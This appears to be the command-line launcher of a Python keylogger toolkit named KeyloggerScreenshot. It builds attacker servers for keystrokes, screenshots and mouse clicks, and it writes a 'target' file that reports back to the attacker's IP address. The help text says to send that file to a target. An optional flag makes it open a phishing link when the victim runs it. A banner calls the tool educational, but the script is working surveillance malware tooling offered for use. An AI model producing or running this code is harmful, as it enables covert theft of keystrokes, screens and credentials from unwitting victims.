import os
try:
    import pyautogui as pg

except:
    files = ["Simulation_code.py","Server_keylogger.py", "Keylogger_Target.py"]
    for this_file in files:
        os.chdir("KeyloggerScreenshot")
        with open(this_file, "r+") as file:
            data = [line.replace("\n", "") for line in file]

        with open(this_file, "w+") as file:
            for each in data:
                if each not in ["import PIL.Image", "from pynput import keyboard", "from pynput.mouse import Listener",
                                "import tkinter as tk", "import pyautogui as pg"]:
                    file.write(f"{each}\n")
        os.chdir("..")

import KeyloggerScreenshot as ks
import sys
import threading
import random
import requests
import subprocess

gui = """
    __ __              __                                 _____                                       __            __ 
   / //_/___   __  __ / /____   ____ _ ____ _ ___   _____/ ___/ _____ _____ ___   ___   ____   _____ / /_   ____   / /_
  / ,<  / _ \ / / / // // __ \ / __ `// __ `// _ \ / ___/\__ \ / ___// ___// _ \ / _ \ / __ \ / ___// __ \ / __ \ / __/
 / /| |/  __// /_/ // // /_/ // /_/ // /_/ //  __// /   ___/ // /__ / /   /  __//  __// / / /(__  )/ / / // /_/ // /_  
/_/ |_|\___/ \__, //_/ \____/ \__, / \__, / \___//_/   /____/ \___//_/    \___/ \___//_/ /_//____//_/ /_/ \____/ \__/  
            /____/           /____/ /____/    

                        ~Created by: Fawaz Bashiru~             
                        ~Write "python KLS_start.py -help" for help    
                        REMINDER THIS WAS BUILD FOR EDUCATIONAL PURPOSES
                        SO DON'T USE THIS FOR EVIL ACTIVITIES
"""
lst = sys.argv

try:
    if "-aip" in lst:  # "aip" stands for address ip
        idx = lst.index("-aip")
        try:
            global simulation
            global boolean

            cmd = subprocess.check_output(["netstat", "-ano"])
            all = cmd.split()

            working_ports = []
            zahlen = [str(zahl) for zahl in range(0, 11)]

            for each in all:
                str_each = str(each)
                if ":" in str_each:
                    switch = str_each[::-1]
                    this_port = ""
                    for port in switch:
                        if port not in zahlen: pass
                        if port == ":": break
                        this_port += port

                    another_switch = this_port[::-1]
                    if "'" in another_switch: another_switch = another_switch.replace("'", "")

                    if len(another_switch) == 4:
                        working_ports.append(another_switch)

            ipaddress = str(lst[idx + 1])

            zahlen = "123456789"
            nummer = 0
            port_numbers = []
            while nummer != 4:
                nummer += 1
                random_port = "".join(random.sample(zahlen, 4))
                if random_port in working_ports:
                    continue
                port_numbers.append(random_port)

            port_photos = int(port_numbers[0])
            port_keylogger = int(port_numbers[1])
            port_listener = int(port_numbers[2])
            port_time = int(port_numbers[3])

            if "-sim" in lst:
                try:
                    if "-cf" not in lst:
                        print(gui)
                        print('YOU HAVE NOT CREATED A FILE. FOR HELP TYPE "python KLS_start.py -help" IN YOUR TERMINAL')
                        quit()
                    print("The simulation is activated")
                    simulation = "simulater=True"
                    boolean = True

                    filename = "Simulation_code.py"

                    if filename not in os.listdir():
                        os.chdir("KeyloggerScreenshot")
                        with open(filename, "r+") as file:
                            data = [each for each in file]
                            data += "\n\nSimulation.start_simulation()"
                        os.chdir("..")
                        with open(filename, "a+") as this_file:
                            for line in data:
                                this_file.write(line)
                        print(f"{filename} HAS BEEN CREATED SO YOU CAN SIMULATE WHERE THE TARGET HAS CLICKED")

                except IndexError:
                    quit()
            else:
                simulation = "simulater=False"
                boolean = False

            if "-ds" in lst:  # "ds" for demon server
                try:
                    server_code = f'''
import KeyloggerScreenshot as ks 
import threading

ip = "{ipaddress}"

server_photos = ks.ServerPhotos(ip, {port_photos})

server_keylogger = ks.ServerKeylogger(ip, {port_keylogger}, {simulation})

server_listener = ks.ServerListener(ip, {port_listener})

server_time = ks.Timer(ip, {port_time})

threading_server = threading.Thread(target=server_photos.start)
threading_server.start()

threading_server2 = threading.Thread(target=server_keylogger.start)
threading_server2.start()

threading_server3 = threading.Thread(target=server_listener.start)
threading_server3.start()

threading_server4 = threading.Thread(target=server_time.start_timer)
threading_server4.start() '''

                    if os.path.exists("demon_server.py"):
                        os.remove("demon_server.py")
                    with open("demon_server.py", "a+") as file:
                        file.write(server_code)

                    print('"demon_server.py" HAS BEEN CREATED')
                except IndexError:
                    quit()
            if "-p" in lst:  # "p" stands for ports
                idx_port = lst.index("-p")
                try:
                    print('ALL THE NUMBERS HAVE BEEN SAVED TO "ports.py"')
                    print(
                        f"\nport_photos = {port_photos}\nport_keylogger = {port_keylogger}\nport_listener = {port_listener}\nport_time = {port_time}\n")
                    with open("ports.py", "a+") as file:
                        file.write(
                            f"port_photos = {port_photos}\nport_keylogger = {port_keylogger}\nport_listener = {port_listener}\nport_time = {port_time}")

                except IndexError:
                    quit()

            if "-s" in lst:  # "s" stands for seconds
                idx_s = lst.index("-s")
                try:
                    if "-cf" not in lst:
                        print(gui)
                        print(
                            'YOU HAVE NOT CREATED A FILE. IF YOU NEED HELP SIMPLY TYPE "python KLS_start.py -help" IN YOUR TERMINAL')
                        sys.exit()
                    if "-" in lst[idx_s + 1]:
                        print(gui)
                        print("PLEASE SPECIFY YOUR SECONDS -s")
                        quit()

                    seconds = int(lst[idx_s + 1])
                    if seconds < 60:
                        print(gui)
                        print(f"SECONDS MUST BE GREATER THAN 60")
                        quit()

                except IndexError:
                    seconds = 60
            else:
                seconds = 60

            if "-phs" in lst:
                phishing_name = None
                try:
                    phs_idx = lst.index("-phs")
                    phishing_name = lst[phs_idx + 1]
                    if "-cf" not in lst:
                        print(gui)
                        print(
                            'YOU HAVE NOT CREATED A FILE. IF YOU NEED HELP SIMPLY TYPE "python KLS_start.py -help" IN YOUR TERMINAL')
                        sys.exit()
                    try:
                        req = requests.get(phishing_name)

                    except requests.exceptions.RequestException:
                        print(gui)
                        print(f'WEBSITE: {phishing_name} IS NOT AVAILABLE')
                        sys.exit()

                except IndexError:
                    print(gui)
                    print("NO LINK HAS BEEN TYPED")
                    sys.exit()

            else:
                phishing_name = None

            if "-cf" in lst:  # "cf" stands for Create file
                idx_cf = lst.index("-cf")
                if phishing_name is not None:
                    phishing_value = f'"{phishing_name}"'
                else:
                    phishing_value = None

                try:

                    filename = lst[idx_cf + 1]
                    if not filename.endswith("py"):
                        data = filename.split(".")
                        filename = f"{data[0]}.py"
                    if "-" in filename:
                        filename = "target.py"

                    if os.path.exists(filename):
                        os.remove(filename)

                    if phishing_name is not None: print(
                        f'LINK: {phishing_name} WILL BE OPEND WHEN {filename} IS EXECUTED')

                    with open(f"{filename}", "a+") as file:
                        file.write(
                            f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()\n")
                    print(f"{filename.upper()} has been created")

                except IndexError:
                    with open("target.py", "a+") as file:
                        file.write(
                            f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()\n")
                    print("TARGET.PY HAS BEEN CREATED YOU CAN SEND THIS TO YOUR TARGET")

            server_photos = ks.ServerPhotos(ipaddress, port_photos)

            server_keylogger = ks.ServerKeylogger(ipaddress, port_keylogger, simulater=boolean)

            server_listener = ks.ServerListener(ipaddress, port_listener)

            server_time = ks.Timer(ipaddress, port_time)

            threading_server = threading.Thread(target=server_photos.start)
            threading_server.start()

            threading_server3 = threading.Thread(target=server_listener.start)
            threading_server3.start()

            threading_server4 = threading.Thread(target=server_time.start_timer)
            threading_server4.start()

            threading_server2 = threading.Thread(target=server_keylogger.start)
            threading_server2.start()
            threading_server2.join()

        except IndexError:
            print(gui)
            print("YOU FORGET TO INSERT YOUR IP")

    elif "-aip" not in lst and "-help" not in lst:
        print(gui)
        print("PLEASE INSERT YOUR IP WITH -aip")

    if "-help" in lst:
        print(gui)
        print(
            "\n-aip INSERT THE SERVERS IP\n-s   SPECIFY YOUR SECONDS (DEFAULT 60 SECONDS)\n-cf  CREATES TARGET FILE WHICH YOU SEND TO ANY TARGET\n-p   SAVES ALL THE PORTS OF THE CURRENT SERVER\n-ds  CREATES A SERVER WITH THE SAME PORTS AS THE TARGET\n-sim ACTIVATES SIMULATION\n-phs OPENS A LINK WHEN THE KEYLOGGER IS EXECUTED\n\n\nIF 'Simulation_code.py' IS IN YOUR DIRECTORY YOU CAN SIMULATE THE CLICKS THE TARGET HAS MADE IF IT HASN'T WORKD ON THE ACTUAL CODE")

except OSError:
    print(
        'CHECK YOUR IP-ADDRESS WITH "ipconfig" ON WINDOWS AND "ifconfig" ON LINUX\n\nIF YOU HAVE THE CORRECT IP ADDRESSS AND IT STILL DOESNT WORK YOU CAN MODIFY YOUR IP ON "keylogger_server.py" AND "keylogger_target.py".\nAFTER THAT YOU CAN SEND THE TARGET OBVIOUSLY THE FILE "keylogger_target.py"')
